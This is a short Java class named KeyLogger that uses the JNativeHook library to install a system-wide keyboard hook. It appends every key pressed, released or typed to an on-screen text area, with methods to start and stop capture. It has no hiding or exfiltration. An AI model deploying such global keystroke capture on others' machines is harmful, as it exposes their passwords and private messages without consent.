package proj.keyLogger;

import javax.swing.JTextArea;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;;

public class KeyLogger implements NativeKeyListener {
	private JTextArea logTxt;
	private boolean check=false;
	private static final Logger log=LoggerFactory.getLogger(KeyLogger.class);

	@Override
	public void nativeKeyPressed(NativeKeyEvent key) {
		logTxt.append("Key Pressed: " + NativeKeyEvent.getKeyText(key.getKeyCode())+"\n");
		if(key.getKeyCode()==NativeKeyEvent.VC_CONTROL) {
			check=true;
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent key) {
		if((!check && key.getKeyCode()!=NativeKeyEvent.VC_CONTROL)|| check) {
			logTxt.append("Key Released: " + NativeKeyEvent.getKeyText(key.getKeyCode())+"\n");
			check=false;
		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent key) {
		logTxt.append("Key Typed: " + key.getKeyText(key.getKeyCode())+"\n");
	}
	
	public void startLogging(JTextArea logTxt) {
		this.logTxt=logTxt;
		
		log.debug("KeyLogger: Started logging.");
		try {
			log.debug("KeyLogger: Trying to get native hook");
			GlobalScreen.registerNativeHook();
			log.debug("KeyLogger: Managed to get native hook.");
		}catch(NativeHookException e) {
			log.error("KeyLogger: Failed to get native hook.", e);
		}
		
		GlobalScreen.addNativeKeyListener(this);
	}
	
	public void stopLogging() {
		logTxt=null;
		
		try {
			log.debug("KeyLogger: Trying to stop logging.");
			GlobalScreen.unregisterNativeHook();
			log.debug("Stopped logging.");
		}catch(NativeHookException e) {
			log.error("KeyLogger: Failed to stop logging.", e);
		}
	}
}